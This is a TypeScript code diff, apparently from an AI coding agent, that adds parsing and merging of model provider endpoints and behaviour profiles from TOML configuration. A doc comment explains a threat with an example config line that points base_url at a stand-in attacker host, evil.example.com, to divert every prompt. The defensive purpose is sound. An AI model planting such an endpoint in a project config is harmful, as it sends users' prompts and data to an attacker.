@@ -28,10 +28,49 @@ export interface ProjectConfig {
   referenceRoots?: string[];
 }
 
+/**
+ * A provider endpoint declared in configuration.
+ *
+ * **User config only.** A project file may name an alias but must never define
+ * where bytes are sent — the same rule the spec applies to SSH remotes (§19.2),
+ * and for the same reason: a checked-in `.agent/config.toml` that could declare
+ * `base_url = "https://evil.example.com"` and set it as the default would route
+ * every prompt to an attacker. `loadConfig` drops project-declared providers and
+ * warns.
+ */
+export interface ProviderEndpointConfig {
+  protocol: 'anthropic-messages' | 'openai-responses' | 'openai-chat';
+  baseUrl: string;
+  /** Environment variable holding the credential. Never the credential itself. */
+  apiKeyEnv?: string;
+  authScheme?: 'Bearer' | 'x-api-key' | 'none';
+  extraHeaders?: Record<string, string>;
+}
+
+/** A behaviour profile declared in configuration (spec §7.4). */
+export interface ModelProfileConfig {
+  contextWindow: number;
+  maxOutputTokens?: number;
+  reservedOutputTokens?: number;
+  supportsParallelTools?: boolean;
+  supportsReasoning?: boolean;
+  preferredEditStrategy?: 'exact' | 'search_replace' | 'apply_patch';
+  autonomy?: 'short' | 'normal' | 'long';
+  toolReliability?: 'low' | 'medium' | 'high';
+  family?: string;
+  inputPerMTok?: number;
+  outputPerMTok?: number;
+  cachedInputPerMTok?: number;
+}
+
 export interface ModelConfig {
   default?: string;
   /** alias → { provider, modelId, profile } */
   aliases?: Record<string, { provider: string; model: string; profile?: string }>;
+  /** provider id → endpoint. User config only; see ProviderEndpointConfig. */
+  providers?: Record<string, ProviderEndpointConfig>;
+  /** profile name → behaviour. */
+  profiles?: Record<string, ModelProfileConfig>;
 }
 
 export interface SecurityConfig {
@@ -150,6 +189,8 @@ export function mergeConfig(lower: KernelConfig, higher: Partial<KernelConfig>):
       ...lower.model,
       ...(higher.model ?? {}),
       aliases: { ...(lower.model.aliases ?? {}), ...(higher.model?.aliases ?? {}) },
+      providers: { ...(lower.model.providers ?? {}), ...(higher.model?.providers ?? {}) },
+      profiles: { ...(lower.model.profiles ?? {}), ...(higher.model?.profiles ?? {}) },
     },
     security: mergeSecurity(lower.security, higher.security ?? {}),
     loop: mergeLoop(lower.loop, higher.loop ?? {}),
@@ -296,9 +337,82 @@ export function configFromToml(table: TomlTable, source: string): Partial<Kernel
         ...(str(entry.profile) ? { profile: str(entry.profile)! } : {}),
       };
     }
+    const providers: Record<string, ProviderEndpointConfig> = {};
+    const providerTable = tableAt(model, 'provider');
+    for (const [name, value] of Object.entries(providerTable ?? {})) {
+      if (typeof value !== 'object' || value === null || Array.isArray(value)) continue;
+      const entry = value as TomlTable;
+      const protocol = str(entry.protocol);
+      const baseUrl = str(entry.base_url);
+
+      if (
+        protocol !== 'anthropic-messages' &&
+        protocol !== 'openai-responses' &&
+        protocol !== 'openai-chat'
+      ) {
+        warnings.push(
+          `${source}: provider "${name}" has protocol "${String(entry.protocol)}"; ` +
+            'expected one of anthropic-messages, openai-responses, openai-chat',
+        );
+        continue;
+      }
+      if (!baseUrl || !/^https?:\/\//.test(baseUrl)) {
+        warnings.push(`${source}: provider "${name}" needs an absolute http(s) base_url`);
+        continue;
+      }
+
+      const scheme = str(entry.auth_scheme);
+      providers[name] = {
+        protocol,
+        baseUrl: baseUrl.replace(/\/+$/, ''),
+        ...(str(entry.api_key_env) ? { apiKeyEnv: str(entry.api_key_env)! } : {}),
+        ...(scheme === 'Bearer' || scheme === 'x-api-key' || scheme === 'none' ? { authScheme: scheme } : {}),
+        ...(headerTable(entry.extra_headers) ? { extraHeaders: headerTable(entry.extra_headers)! } : {}),
+      };
+    }
+
+    const profiles: Record<string, ModelProfileConfig> = {};
+    const profileTable = tableAt(model, 'profile');
+    for (const [name, value] of Object.entries(profileTable ?? {})) {
+      if (typeof value !== 'object' || value === null || Array.isArray(value)) continue;
+      const entry = value as TomlTable;
+      const contextWindow = num(entry.context_window);
+      if (contextWindow === undefined || contextWindow <= 0) {
+        warnings.push(`${source}: model profile "${name}" needs a positive context_window`);
+        continue;
+      }
+      profiles[name] = {
+        contextWindow,
+        ...(num(entry.max_output_tokens) !== undefined
+          ? { maxOutputTokens: num(entry.max_output_tokens)! }
+          : {}),
+        ...(num(entry.reserved_output_tokens) !== undefined
+          ? { reservedOutputTokens: num(entry.reserved_output_tokens)! }
+          : {}),
+        ...(bool(entry.supports_parallel_tools) !== undefined
+          ? { supportsParallelTools: bool(entry.supports_parallel_tools)! }
+          : {}),
+        ...(bool(entry.supports_reasoning) !== undefined
+          ? { supportsReasoning: bool(entry.supports_reasoning)! }
+          : {}),
+        ...(str(entry.autonomy) ? { autonomy: str(entry.autonomy) as ModelProfileConfig['autonomy'] } : {}),
+        ...(str(entry.tool_reliability)
+          ? { toolReliability: str(entry.tool_reliability) as ModelProfileConfig['toolReliability'] }
+          : {}),
+        ...(str(entry.family) ? { family: str(entry.family)! } : {}),
+        ...(num(entry.input_per_mtok) !== undefined ? { inputPerMTok: num(entry.input_per_mtok)! } : {}),
+        ...(num(entry.output_per_mtok) !== undefined ? { outputPerMTok: num(entry.output_per_mtok)! } : {}),
+        ...(num(entry.cached_input_per_mtok) !== undefined
+          ? { cachedInputPerMTok: num(entry.cached_input_per_mtok)! }
+          : {}),
+      };
+    }
+
     out.model = {
       ...(str(model.default) !== undefined ? { default: str(model.default)! } : {}),
       ...(Object.keys(aliases).length > 0 ? { aliases } : {}),
+      ...(Object.keys(providers).length > 0 ? { providers } : {}),
+      ...(Object.keys(profiles).length > 0 ? { profiles } : {}),
     };
   }
 
@@ -393,6 +507,15 @@ function num(v: TomlValue | undefined): number | undefined {
 
 function bool(v: TomlValue | undefined): boolean | undefined {
   return typeof v === 'boolean' ? v : undefined;
+}
+
+function headerTable(v: TomlValue | undefined): Record<string, string> | undefined {
+  if (typeof v !== 'object' || v === null || Array.isArray(v)) return undefined;
+  const out: Record<string, string> = {};
+  for (const [k, value] of Object.entries(v as TomlTable)) {
+    if (typeof value === 'string') out[k] = value;
+  }
+  return Object.keys(out).length > 0 ? out : undefined;
 }
 
 function strList(v: TomlValue | undefined): string[] | undefined {
